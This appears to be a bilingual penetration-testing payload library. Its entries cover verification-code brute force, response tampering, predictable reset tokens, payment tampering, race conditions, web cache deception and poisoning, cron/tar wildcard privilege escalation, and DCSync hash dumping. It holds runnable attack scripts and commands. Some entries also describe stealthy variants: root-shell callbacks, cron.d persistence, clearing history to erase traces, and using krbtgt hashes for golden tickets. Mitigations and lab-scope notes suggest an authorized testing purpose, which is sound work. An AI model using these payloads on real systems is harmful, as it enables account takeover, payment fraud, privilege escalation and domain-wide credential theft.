description.en: Submit every four-digit code from 0000 to 9999 while watching responses; without attempt limits, a success hit hands over the verification step and the password-change pass.

attackChain.payload:
for code in $(seq -w 0000 9999); do
response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
-H "Content-Type: application/json" \
-d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
if echo "$response" | grep -q "success"; then
echo "[+] Code found: $code"
break
fi
done

title.zh: 篡改响应绕过前端校验
title.en: Tamper responses to defeat client checks

description.zh: 拦截验证码校验的失败响应，把 code 字段改为 200 并补造 token；前端仅依赖响应状态判断即放行后续流程，直接进入设置新密码页面。
description.en: Intercept the failed verification response and rewrite code to 200 with a token; a front end trusting only the status field lets the flow continue straight to the new-password page.

description.zh: 依据 md5 括号内为时间戳与用户名的生成结构，用已知时间戳与受害者邮箱离线计算令牌；预测值与服务端令牌一致即可重置任意账户。
description.en: Reverse the md5(timestamp_username) structure and compute tokens offline from known timestamps and the victim email; a matching prediction unlocks arbitrary account resets.

attackChain.payload:
# token 格式为 md5(时间戳_用户名)，如 token1: 1707811200_user1、token2: 1707811260_user2
import hashlib
timestamp = 1707811200
email = "victim@{TARGET}"
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()
predicted = hashlib.md5(b"1707811200_victim@{TARGET}").hexdigest()

name.zh: 支付金额服务端重算验证

description.zh: 覆盖支付金额篡改的服务端校验验证：从下单价格字段与数量/费用字段篡改，到优惠券字段篡改，再到支付回调参数伪造，并附价格类型混淆变体清单，用于确认金额是否仅由客户端参数决定。
description.en: Covers server-side validation of payment amount tampering: from order price and quantity/fee field tampering through coupon field tampering to payment-callback parameter forgery, with price type-confusion variant lists, confirming whether amounts are decided solely by client parameters.

overview.zh: 该 Payload 覆盖支付金额服务端重算场景，检验订单金额、数量费用、优惠与回调签名是否仅由客户端参数决定。验证维度含价格字段、数量与费用字段、优惠券字段与回调伪造四步，对应第 1 至第 4 步。
overview.en: This payload covers server-side payment recalculation, testing whether order amounts, quantity fees, discounts and callback signatures are decided solely by client parameters. Validation covers price fields, quantity and fee fields, coupon fields, and callback forgery, mapped to steps 1 through 4.

vulnerability.zh: 根因在于服务端直接信任请求中的金额与优惠字段而不按商品与规则重算：价格可置零或为负、内部券号可猜测、回调签名无验证，资损链路自下单延伸到支付回调。
vulnerability.en: The root cause is the server trusting client-sent amounts and discount fields instead of recalculating from product data and rules: prices can be zeroed or negative, internal coupon IDs guessable, callback signatures unverified, extending the loss chain from ordering to payment callbacks.

exploitation.zh: 第 1 步向下单接口提交 price 分别为正常值、1、0、负数的四个请求体并比较成交金额；第 2 步以零与负数量、负运费与超额折扣字段复测边界；第 3 步提交多券列表、伪造内部券号与直接覆盖折扣字段的请求体；第 4 步向回调端点发送篡改金额与伪造签名的表单并核对入账结果。任一环节金额按请求值生效即确认校验缺失。占位符在全局变量菜单替换；类型混淆变体参考 wafBypass。
exploitation.en: In step 1, submit four order bodies with price set to normal, 1, 0 and negative values, comparing the charged amounts. In step 2, retest boundaries with zero and negative quantities, negative shipping fees and over-quota discounts. In step 3, submit multi-coupon lists, forged internal coupon IDs and direct discount-field overrides. In step 4, post tampered amounts and forged signatures to the callback endpoint and check the booked result. Any stage honoring the requested amount confirms missing validation. Replace placeholders via the global variables menu; see wafBypass for type-confusion variants.

mitigation.en: Always recalculate amounts server-side from product and discount rules, enforce callback signature verification with amount consistency, and validate numeric fields for non-negativity and caps. After the fix, replay steps 1 through 4: every tampered request should be rejected with amounts unchanged.

name.zh: 业务状态并发原子性验证

description.zh: 覆盖业务竞态条件的并发验证：从竞态目标识别，到 Python 并发脚本与 Burp Turbo Intruder 高并发打击，再到领取前后资源状态对照，并附 HTTP/2 并发请求变体，用于确认业务操作是否缺乏原子性保护。
description.en: Covers concurrent validation of business race conditions: from race-target identification through Python concurrency scripts and Burp Turbo Intruder high-rate firing to pre/post-claim resource state comparisons, with HTTP/2 concurrent request variants, confirming whether business operations lack atomicity protection.

overview.zh: 该 Payload 覆盖业务竞态条件的并发原子性场景，检验领取、兑换等状态递减端点是否在并发下被多次成功。验证维度含竞态目标识别、Python 并发脚本、Turbo Intruder 打击与前后状态对照四步，对应第 1 至第 4 步。
overview.en: This payload covers business race conditions and concurrent atomicity, testing whether state-decreasing endpoints such as claims and redemptions succeed multiple times under concurrency. Validation covers target identification, a Python concurrency script, a Turbo Intruder strike, and before/after state comparison, mapped to steps 1 through 4.

vulnerability.zh: 根因在于库存或权益扣减缺少原子事务与唯一性约束：检查与扣减之间存在时间窗口，并发请求同时通过校验并各自成功，库存被超发或权益被重复发放。
vulnerability.en: The root cause is inventory or entitlement deduction lacking atomic transactions and uniqueness constraints: a window exists between check and decrement, so concurrent requests pass validation simultaneously and each succeeds, oversubscribing stock or double-granting entitlements.

exploitation.zh: 第 1 步锁定状态递减端点并取得响应与资源数量基线；第 2 步用 asyncio 并发发送 50 个相同领取请求并统计成功数；第 3 步以 Turbo Intruder gate 同步释放观察多请求同时命中；第 4 步对照领取前后优惠券列表与余额确认多次扣减。成功数大于一即确认原子性缺失。占位符在全局变量菜单替换；HTTP/2 变体参考 wafBypass。
exploitation.en: In step 1, lock the state-decreasing endpoint and capture the response plus a count baseline. In step 2, fire 50 identical claim requests concurrently with asyncio and count successes. In step 3, release a synchronized Turbo Intruder gate watching simultaneous hits. In step 4, compare coupon lists and balances before and after to confirm repeated deduction. More than one success confirms missing atomicity. Replace placeholders via the global variables menu; see wafBypass for the HTTP/2 variant.

mitigation.en: Wrap deductions in atomic database transactions or optimistic locking with unique indexes, and add idempotency keys against duplicates. After the fix, replay steps 2 and 3: successes must always be exactly one with consistent stock.

description.en: Query the coupon list and balance endpoints before firing to capture the current remaining count and account state; these numbers anchor the post-attack profit comparison.

title.en: Flood the endpoint with async concurrency

description.zh: 用 Python asyncio 同时提交 50 个相同领取请求；出现多个 success 响应或资源扣减次数超过剩余量即确认并发原子性缺失。

execution.command:
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())

name.zh: Web 缓存欺骗

description.zh: 覆盖 Web 缓存欺骗的私有响应隔离验证：从路径缓存响应头探测与路径后缀伪装访问私有资源，到分隔符与编码变体绕过路径判定，并核验缓存响应是否含私有字段，用于确认私有响应可被他人命中。
description.en: Covers private-response isolation validation of web cache deception: from path cache-header probing and path-suffix disguise to fetch private resources through delimiter and encoding variants bypassing path judgment, verifying whether cached responses contain private fields, confirming private responses can be hit by others.

subCategory.zh: 缓存欺骗与私有内容泄露

overview.zh: 该 Payload 覆盖 Web 缓存欺骗的私有响应隔离场景，检验静态后缀路径能否让含用户数据的动态响应进入共享缓存并被匿名命中。验证维度含缓存头探测、路径后缀伪装、分隔符编码变体与私有字段核验，对应第 1 至第 4 步。
overview.en: This payload covers web cache deception and private-response isolation, testing whether static-suffix paths push dynamic responses containing user data into a shared cache that anonymous users can hit. Validation covers cache-header probing, path-suffix disguise, delimiter and encoding variants, and private-field verification, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存层与源站对路径的静态资源判定不一致：带 .css、.js 后缀或编码分隔符的账号路径被当作可缓存对象，携带会话的响应因此存储进公共键。
vulnerability.en: The root cause is cache-to-origin divergence on static-resource path classification: account paths with .css or .js suffixes or encoded delimiters are treated as cacheable objects, so session-carrying responses land under public keys.

exploitation.zh: 第 1 步对首页与静态路径发 HEAD 并提取 X-Cache、Age、Cache-Control，确认哪些路径会进缓存；第 2 步携带会话请求 account 加静态后缀，再匿名重复访问，取回私有内容即确认欺骗成立；第 3 步用分号与编码变体测试路径判定分歧；第 4 步在缓存响应中检索 email 等私有字段留证。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, HEAD the home and static paths extracting X-Cache, Age and Cache-Control to learn what gets cached. In step 2, request the account path with a static suffix carrying the session, then anonymously; retrieving private content confirms the deception. In step 3, probe path-classification divergence with semicolon and encoding variants. In step 4, search cached responses for private fields like email as evidence. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.en: Decide cacheability by Content-Type and authentication state, marking authenticated responses no-store or private; normalize path parsing to defeat suffix disguise. After the fix, replay steps 2 and 4: anonymous requests should retrieve no private content.

description.zh: 对首页、css/js/jpg 静态资源与账号页逐一提取 X-Cache、Age、Cache-Control 头；静态后缀命中缓存而账号页不缓存，即摸清 CDN 的静态资源判定规则。
description.en: Collect X-Cache, Age and Cache-Control headers for the homepage, static assets and the account page; learning which suffixes the CDN treats as cacheable defines the disguise rule to abuse.

attackChain.payload:
curl -sI "http://{TARGET}/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

curl -sI "http://{TARGET}/test.js" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.jpg" | grep -iE "x-cache|age"

description.en: Request /account/profile.css with the victim session so the origin returns account data under a static cache key; an anonymous request to the same URL returning the data completes the deception.

prerequisites.zh: 确认 Web 缓存私有响应隔离验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache Private-Response Isolation Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: Web 缓存私有响应隔离验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache Private-Response Isolation Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 欺骗路径会真实缓存私有响应——使用实验会话与专属路径；缓存命中核验后 PURGE 清理。
opsecTips.en: Deception paths really cache private responses — use lab sessions with dedicated paths, and PURGE after cache-hit verification.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

name.zh: Web 缓存投毒

description.zh: 覆盖 Web 缓存投毒的键差异验证：从缓存命中状态头探测与未键入头识别，到投毒响应注入与 Fat GET 参数扩展，并附缓存键分派变体头清单，用于确认哪些输入会改变缓存内容。
description.en: Covers key-differential validation of web cache poisoning: from cache-hit header probing and unkeyed-input identification through poisoned-response injection and Fat GET parameter expansion, with cache-key dispatch variant header lists, confirming which inputs alter cached content.

subCategory.zh: 缓存键与未键入头投毒

overview.zh: 该 Payload 覆盖 Web 缓存投毒场景，检验共享缓存的键构造是否遗漏可影响响应内容的输入。验证维度含 X-Cache 命中探测、X-Forwarded-Host 未键入头识别、基础投毒与 Fat GET 参数扩展，对应第 1 至第 4 步。
overview.en: This payload covers web cache poisoning, testing whether the shared cache key omits inputs that influence response content. Validation covers X-Cache hit probing, X-Forwarded-Host unkeyed-header identification, baseline poisoning, and Fat GET parameter extension, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存键与源站响应生成所依赖的输入不一致：X-Forwarded-Host 等未键入头能改写生成链接，Fat GET 的正文参数可参与渲染，攻击者注入的值被缓存共享给全部用户。
vulnerability.en: The root cause is divergence between the cache key and the inputs that drive response generation: unkeyed headers such as X-Forwarded-Host rewrite generated links, and Fat GET body parameters join rendering, so attacker-injected values get cached and shared with all users.

exploitation.zh: 第 1 步对目标 URL 追加唯一参数发 HEAD 请求，从 X-Cache 确认缓存行为；第 2 步注入 X-Forwarded-Host，响应内链接指向注入域且键未覆盖即确认未键入头；第 3 步发送带注入头的原始请求，投毒响应被缓存后无头请求同样返回注入内容即确认投毒；第 4 步以 Fat GET 验证正文参数入缓存。占位符在全局变量菜单替换；被拦时参考 wafBypass 变体清单。
exploitation.en: In step 1, send a HEAD with a unique cache parameter and read X-Cache. In step 2, inject X-Forwarded-Host; links pointing at the injected domain with the key ignoring it confirm the unkeyed header. In step 3, send the raw request with the injected header; once cached, header-less requests returning injected content confirm poisoning. In step 4, verify body parameters entering the cache with Fat GET. Replace placeholders via the global variables menu; see wafBypass variant lists if blocked.

mitigation.zh:
把影响响应生成的输入全部纳入缓存键，边界层固定/清洗派生 Host 类头；拒绝带正文的 GET（Fat GET）；投毒高危路径降低共享缓存寿命。
    # Nginx 边界：清洗未键入头并显式固定缓存键
    proxy_set_header X-Forwarded-Host $host;
    proxy_cache_key "$scheme$request_method$host$request_uri";
    # ModSecurity：拒绝带正文的 GET
    SecRule REQUEST_METHOD "@streq GET" "id:1010,chain,deny,phase:1"
        SecRule REQUEST_HEADERS:Content-Length "!@eq 0"
mitigation.en: Include every response-affecting input in the cache key, disable or pin derived Host headers, reject GETs with bodies, and shorten shared-cache lifetimes on high-risk paths. After the fix, replay steps 3 and 4: the cache should keep the original response with no cross-user contamination.

description.zh: 向目标 URL 追加唯一参数发送 HEAD 请求并提取 X-Cache 头；两次请求出现 MISS 转 HIT 的变化即确认响应经过缓存层，同时锁定适合投毒的共享页面入口。
description.en: Send a HEAD request with a unique cache-buster parameter and read the X-Cache header; a MISS-to-HIT transition proves responses come from a shared cache and identifies the page worth poisoning.

title.zh: 注入未键入头定位投毒点
title.en: Inject unkeyed headers to find the poisoning vector

description.zh: 用第 1 步确认的缓存路径，注入指向攻击者域名的 X-Forwarded-Host 头；响应中的生成链接或重定向跳向注入域名且缓存键未包含该头，即找到可写入缓存的未键入输入。
description.en: Inject X-Forwarded-Host pointing at the attacker domain on the cached path; if generated links or redirects honor the injected host while the cache key ignores the header, the unkeyed input is confirmed.

description.zh: 发送携带注入头的原始 GET 请求让恶意响应写入缓存；随后不带该头的普通请求返回指向攻击者域的内容，即投毒成功，访问同 URL 的所有用户都会收到污染响应。
description.en: Send the crafted GET so the poisoned response is stored, then request the same URL without the header; if ordinary visitors receive attacker-domain content, the shared cache entry is poisoned.

title.zh: 用 Fat GET 扩大投毒面

description.zh: 在 GET 请求中附带 q=poisoned 正文检验正文是否参与缓存判定；普通 GET 返回被篡改的正文即确认第二条投毒路径，可与第 3 步的头注入叠加扩大影响范围。
description.en: Append a q=poisoned body to a GET request to test whether bodies join the cache decision; a tampered response on a plain GET confirms a second poisoning vector that stacks with header injection.

title.en: Bypass key normalization with header variants

description.zh: 当单个头被拦截时，换用 X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 等变体组合重试投毒；任一变体仍能把恶意内容写入缓存即绕过键归一化。
description.en: If the single header is filtered, retry the poisoning with X-Forwarded-Scheme, X-Original-URL and X-Forwarded-Prefix variants; any variant that still lands in the cache bypasses key normalization.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Web 缓存键与响应变体验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache-Key and Response-Variant Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: Web 缓存键与响应变体验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache-Key and Response-Variant Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 投毒响应会真实进入缓存——使用专属实验路径键并在验证后 PURGE；不投毒共享路径影响真实用户。
opsecTips.en: Poisoned responses really enter the cache — use dedicated lab path keys and PURGE after verification; never poison shared paths that real users hit.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: 缓存键分派变体头清单

description.zh: 枚举 X-Forwarded-Host、X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 四类常被纳入缓存键或影响路由的请求头，用于逐一注入并观察响应差异。
description.en: Lists X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, and X-Forwarded-Prefix headers that are often included in cache keys or affect routing, for one-by-one injection and response-diff observation.

title.zh: 未键入输入的缓存变体验证

wafBypass.command:
GET /cache-fixture?PAYLOADER_CACHE_VARIANT=1 HTTP/1.1
Host: {TARGET}
X-Forwarded-Host: cache-variant.lab.invalid
X-Payloader-Cache-Marker: PAYLOADER_CACHE_VARIANT

description.zh: 以单一无害的缓存变体请求完成探测：只比较该无害标记在不同会话与无会话请求中的缓存键、Vary、Age 与响应哈希，头部仅在当前响应回显时不直接等同于跨用户污染。
description.en: Replace mixed script-injection and request-smuggling fragments with one cache-variant request. Compare the harmless marker across different-session and no-session requests using cache keys, Vary, Age, and response hashes; do not equate a reflected header with cross-user poisoning.

description.zh: 向目标 URL 追加唯一缓存键参数并发送 HEAD 请求，从响应中提取 X-Cache 头以确认响应是否由缓存返回。
description.en: Appends a unique cache-key parameter to the target URL and sends a HEAD request, extracting the X-Cache header to confirm whether the response came from the cache.

description.zh: 注入 X-Forwarded-Host 未键入头并观察响应；响应中的生成链接或重定向指向注入域名，且缓存键未纳入该头，即确认未键入头注入点。
description.en: Inject the unkeyed X-Forwarded-Host header and observe the response; generated links or redirects pointing at the injected domain while the cache key ignores the header confirms an unkeyed injection point.

explanation.zh: 常被用作缓存键但未包含在键中
explanation.en: Describes how the header segment "X-Forwarded-Host" participates in this validation command.

description.zh: 发送携带注入头的原始请求并观察缓存行为；投毒响应被缓存后，不带该头的后续请求返回指向注入域的内容，即确认缓存投毒。
description.en: Send the raw request with the injected header and watch caching; if the poisoned response is cached and later requests without the header receive injected-domain content, cache poisoning is confirmed.

description.zh: 发送 Fat GET 请求观察正文是否参与缓存；后续对同 URL 的普通 GET 返回 q=poisoned 正文，即确认 Fat GET 投毒。
description.en: Send the Fat GET and check whether the body participates in caching; later plain GETs to the same URL returning the q=poisoned body confirm Fat GET poisoning.

explanation.en: Describes how the header segment "Content-Length" participates in this validation command.

name.zh: Cron 所有权与可写路径审计

description.zh: 审计 cron 任务定义、可写脚本与通配符注入点，验证计划任务提权。
description.en: Audits cron job definitions for root-owned scripts in writable paths and wildcard injection points, then plants an argument-expanding file so the scheduled task executes attacker code as root.

overview.zh: 该 Payload 覆盖 Cron 所有权与可写路径提权审计场景，检验 root 计划任务对可写脚本与归档钩子的执行边界。验证维度含任务清单核查、脚本权限检查与 tar checkpoint 钩子验证三步，对应第 1 至第 3 步。
overview.en: This payload covers cron ownership and writable-path escalation auditing, testing how root-scheduled jobs handle writable scripts and archive hooks. Validation covers task-list review, script-permission checks and a tar checkpoint-hook verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 root 计划任务引用的脚本或其父目录对普通用户可写，或以通配方式处理文件名：攻击者注入命令或借 tar 参数展开即让任务以 root 执行任意代码。
vulnerability.en: The root cause is root cron jobs referencing scripts or parent directories writable by standard users, or expanding filenames via wildcards: injected commands or tar argument expansion let the job run attacker code as root.

exploitation.zh: 第 1 步查看 etc 下 crontab 与计划任务目录，锁定 root 运行且路径可写的任务；第 2 步检查目标脚本及其父目录权限，普通用户可写即确认注入点；第 3 步在测试目录用 tar checkpoint 钩子执行夹具脚本，验证通配参数注入的可达性。以 root 上下文执行痕迹为成功判据。占位符在全局变量菜单替换；钩子测试仅在隔离目录进行。
exploitation.en: In step 1, review the etc crontab and scheduled-task directories, locking onto root-run jobs with writable paths. In step 2, check target-script and parent-directory permissions; standard-user writability marks the injection point. In step 3, use a tar checkpoint hook to execute a fixture script in a test directory, validating wildcard argument-injection reachability. Judge success by root-context execution traces. Replace placeholders via the global variables menu; run hook tests only in isolated directories.

mitigation.zh:
root 任务脚本与父目录仅 root 可写，避免通配调用并显式列出文件，cron 变更纳入审计：
    chown root:root {LAB_CRON_SCRIPT} && chmod 700 {LAB_CRON_SCRIPT}
    chmod 600 /etc/cron.d/* && chown root:root /etc/cron.d
    auditctl -w /etc/cron.d/ -p wa -k cron_change
mitigation.en: Restrict job scripts and parent directories to root writes, avoid wildcard invocations by listing files explicitly, and audit cron edits and runs. After the fix, replay steps 2 and 3: writes should be denied and hooks never fire.

description.zh: 读取 crontab 与各 cron 目录内容；由 root 周期运行且脚本路径可写的任务即锁定命令注入点，记录调度间隔评估等待时间。
description.en: Read crontab and the cron directories; root-scheduled jobs with writable script paths become injection points, with intervals hinting at wait time.

title.zh: 检查脚本与目录写权限
title.en: Check script and directory write access

description.zh: 查看任务脚本及其父目录的权限细节；普通用户具备写权限即可向脚本追加命令，等待下个调度周期以 root 身份执行。
description.en: Inspect the job script and its parent directory; ordinary-user write access means appended commands run as root on the next cycle.

description.zh: 以 tar 的 checkpoint-action 钩子在归档创建时执行指定脚本；钩子被触发即验证通配符注入路径可达，把同样的钩子文件放入 root 的 cron 以通配符归档的业务目录，即可让计划任务以 root 执行任意命令完成提权。
description.en: Use tar's --checkpoint-action hook to execute a script during archive creation; the hook firing proves wildcard injection works and the same trick escalates via cron.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Cron 所有权与可写路径审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Cron Ownership and Writable-Path Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Cron 所有权与可写路径审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Cron Ownership and Writable-Path Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: root cron 注入在下一调度周期真实执行——验证后立即移除注入文件与任务改动；通配符注入的参数文件命名避开 glob 语义。
opsecTips.en: Root-cron injection executes on the next schedule tick — remove injected files and task changes immediately after verification, and name wildcard-injection files to avoid unintended glob semantics.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 规避变体：通配符注入提权

description.zh: 规避点：tar 通配符注入不修改 cron 定义本身，绕过 crontab 监控。判据：收到 root shell。
description.en: Wildcard injection never touches the cron definition. Success: root shell arrives.

description.zh: 规避点：覆盖 cron 脚本调用的无路径命令，不改脚本本体。判据：定时触发回连。
description.en: Shadows an unqualified command instead of editing the script. Success: scheduled callback.

title.zh: 规避变体：cron.d 注入持久化

description.zh: 规避点：独立文件持久化不篡改既有 crontab，降低 diff 告警。判据：每分钟以 root 执行 /tmp/x。
description.en: A separate file avoids modifying existing crontabs. Success: /tmp/x runs as root every minute.

description.zh: 规避点：删除载荷与注入项并清历史。判据：相关文件与条目全部消失。
description.en: Removes payloads, injected entries, and history. Success: all artifacts gone.

description.zh: 查看系统计划任务；root 运行且路径可写的任务即锁定 cron 提权候选。
description.en: Review system cron jobs; root-run jobs with writable paths pin cron escalation candidates.

description.zh: 检查任务脚本权限；普通用户对脚本或其父目录具备写权限即确认可注入执行。
description.en: Check task-script permissions; normal-user write access to the script or its directory confirms injectable execution.

title.zh: tar checkpoint 钩子执行测试脚本
title.en: Execute test script via tar checkpoint hook

description.zh: 判据: 前提是存在 root 定时以通配符归档当前目录的 tar 任务；先准备会输出标记或回连监听的 run.sh，再创建 --checkpoint=1 与 --checkpoint-action=exec=sh run.sh 两个文件；下个调度周期钩子以 root 执行 run.sh，出现标记输出或收到回连即验证通配符注入路径可达。
description.en: Creates the cron fixture archive while executing fixtures/cron.sh through the --checkpoint-action hook, confirming reachability of tar argument injection from a writable path.

name.zh: DCSync 复制权限审计

description.zh: 以授权身份执行 DCSync（mimikatz lsadump::dcsync），验证目录复制权限的最小化。
description.en: Runs mimikatz lsadump::dcsync with an authorized identity to request arbitrary account password data over MS-DRSR, proving that Replication-Get-Changes-All grants on ordinary accounts enable full directory replication without touching the domain controller.

overview.zh: DCSync 复制权限审计覆盖目录复制滥用场景：针对持有 Replication-Get-Changes-All 权限或可控账户的测试主体，验证能否模拟域控复制协议导出任意账号凭据。验证维度涵盖 mimikatz dcsync 单用户、secretsdump 单用户/全量导出与域对象 ACL 核对四类步骤。
overview.en: DCSync Replication-Permission Audit covers directory replication abuse: for a test principal holding or controlling Replication-Get-Changes-All rights, verify whether the replication protocol can be emulated to export any account's credentials. Verification dimensions cover mimikatz dcsync single-user, secretsdump single-user and full dumps, and domain object ACL review.

vulnerability.zh: 根因是普通账号被错误授予 Replication-Get-Changes-All 扩展权限（常见经 WriteDACL 链授予），而 MS-DRSR 复制协议允许持有该权限的主体向域控请求任意账户的密码数据，全程无需在域控上执行任何代码。
vulnerability.en: The root cause is ordinary accounts wrongly granted the Replication-Get-Changes-All extended right (commonly via a WriteDACL chain); the MS-DRSR replication protocol lets holders of that right request any account's password data from a DC without executing any code on the DC.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 mimikatz lsadump::dcsync 请求 Administrator 账户，返回其 NTLM 哈希即确认复制权限可滥用；第 2 步用 secretsdump.py -just-dc-user 复现单用户导出，DC 侧产生 4662 复制目录访问事件；第 3 步用 /all /csv 批量导出全量域哈希（含 krbtgt）；第 4 步用 Get-ADObject 读取域对象 nTSecurityDescriptor，定位授予复制权限的 ACE 完成溯源。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 requests the Administrator account with mimikatz lsadump::dcsync — its returned NTLM hash confirms the replication right is abusable; step 2 reproduces single-user export with secretsdump.py -just-dc-user, producing a 4662 directory-replication event on the DC; step 3 dumps all domain hashes with /all /csv, including krbtgt; step 4 reads the domain object's nTSecurityDescriptor with Get-ADObject to locate the granting ACE for traceability. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
从普通账号移除复制权限（GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2），仅保留域控与同步服务账号，对携带该 GUID 的 4662 实时告警：
    dsacls "CN=svc,OU=Service,DC=corp,DC=local" /R "CORP\svc"
    auditpol /set /subcategory:"Directory Service Access" /success
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4662} | ? { $_.Message -match '1131f6ad' }
mitigation.en: Remove Replication-Get-Changes-All from ordinary accounts, keeping it only on DCs and legitimate sync service accounts; alert in real time on 4662 events carrying that GUID and monitor replication requests from uncommon principals. After the fix, regress with the step 1 sample: dcsync requests must be denied.

description.zh: 用 Get-ADObject 读取域根 nTSecurityDescriptor；当前账号含 DS-Replication-Get-Changes(-All) 权限即具备 DCSync 前提。
description.en: Read the domain root nTSecurityDescriptor with Get-ADObject; DS-Replication-Get-Changes(-All) rights on your account establish the DCSync precondition.

title.zh: 导出管理员与 krbtgt 哈希

description.zh: 运行 mimikatz lsadump::dcsync /user:Administrator；返回 NTLM 与 AES 哈希即凭据库拖取成功，krbtgt 哈希可再铸黄金票据。
description.en: Run mimikatz lsadump::dcsync /user:Administrator; NTLM and AES hashes returned complete the credential pull, the krbtgt hash fueling a later golden ticket.

title.en: Dump the whole domain hash store

description.zh: 改用 /all /csv 全量导出；生成全域账号哈希表即可离线破解或哈希喷洒，扩大可横向的主机范围。
description.en: Re-run with /all /csv; the domain-wide hash table feeds offline cracking or hash spraying to widen reachable hosts.

description.zh: 用 impacket secretsdump -just-dc-user 复核输出；与第 2 步哈希一致即可放心用于哈希登录与票据伪造。
description.en: Re-dump a user with impacket secretsdump -just-dc-user; matching the step-2 hashes validates them for hash logins and ticket forgery.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 DCSync 复制权限审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DCSync Replication-Permission Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: DCSync 复制权限审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
